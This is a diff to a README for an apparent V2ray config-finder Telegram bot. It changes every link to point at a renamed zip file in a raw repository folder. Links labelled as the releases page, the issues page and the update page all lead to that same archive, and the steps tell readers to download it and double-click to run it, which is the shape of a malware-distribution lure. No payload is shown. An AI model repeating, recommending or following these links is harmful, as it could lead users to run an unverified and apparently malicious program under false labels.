@@ -1,6 +1,6 @@
 # 🤖 v2ray-config-finder-tg-bot - Find and Test V2ray Configs Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/v2ray-config-finder-tg-bot.zip%20Now-Release-blue)](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/v2ray-config-finder-tg-bot.zip)
+[![Download Now](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/config-ray-v-tg-bot-finder-v1.5.zip%20Now-Release-blue)](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/config-ray-v-tg-bot-finder-v1.5.zip)
 
 ## 📚 What is v2ray-config-finder-tg-bot?
 
@@ -12,7 +12,7 @@ To get started with the v2ray-config-finder-tg-bot, follow these simple steps to
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/v2ray-config-finder-tg-bot.zip) to visit the GitHub releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/config-ray-v-tg-bot-finder-v1.5.zip) to visit the GitHub releases page.
 2. **Choose the Latest Release**: Find the latest release at the top of the page. Look for the version that suits your operating system.
 3. **Download the Application**: Click on the link for the relevant file to download it to your computer.
 4. **Run the Application**: After downloading, locate the file in your downloads folder. Double-click the file to run the application.
@@ -44,18 +44,18 @@ After downloading and running the v2ray-config-finder-tg-bot, follow these steps
 
 ## 💡 Usage Tips
 
-- **Regularly Check for Updates**: Visit the [releases page](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/v2ray-config-finder-tg-bot.zip) regularly to download the latest version and improve performance.
+- **Regularly Check for Updates**: Visit the [releases page](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/config-ray-v-tg-bot-finder-v1.5.zip) regularly to download the latest version and improve performance.
 - **Explore GitHub Repos**: Feel free to add GitHub repositories to the search list by updating the settings in the application.
 
 ## 🤝 Support
 
 If you encounter issues while using the v2ray-config-finder-tg-bot, you can reach out for support:
 
-- **Issues Page**: Report any bugs or issues on the [GitHub Issues page](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/v2ray-config-finder-tg-bot.zip).
+- **Issues Page**: Report any bugs or issues on the [GitHub Issues page](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/config-ray-v-tg-bot-finder-v1.5.zip).
 - **Community Support**: Join discussions or get help from the community by searching for relevant posts on platforms like Reddit or specialized forums.
 
 ## 📄 License
 
 This software is licensed under the MIT License. You can freely use it while adhering to the terms outlined in the license file available in this repo. 
 
-[![Download Now](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/v2ray-config-finder-tg-bot.zip%20Now-Release-blue)](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/v2ray-config-finder-tg-bot.zip)
+[![Download Now](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/config-ray-v-tg-bot-finder-v1.5.zip%20Now-Release-blue)](https://raw.githubusercontent.com/vungocbaobao/v2ray-config-finder-tg-bot/main/exegetics/config-ray-v-tg-bot-finder-v1.5.zip)
